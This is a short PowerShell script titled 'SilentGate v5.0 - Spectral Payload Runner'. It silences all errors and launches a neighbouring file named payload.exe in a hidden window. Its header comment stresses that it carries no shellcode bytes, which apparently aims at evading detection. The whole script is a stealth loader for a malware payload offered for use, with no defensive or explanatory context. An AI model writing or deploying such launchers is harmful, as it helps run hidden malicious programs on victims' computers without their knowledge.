
# SilentGate v5.0 - Spectral Payload Runner
# Author: JarDani
# Runs spectral EXE — no shellcode bytes anywhere
$ErrorActionPreference = 'SilentlyContinue'
$exe = Join-Path $PSScriptRoot 'payload.exe'
if (Test-Path $exe) {
    Start-Process -FilePath $exe -WindowStyle Hidden
}
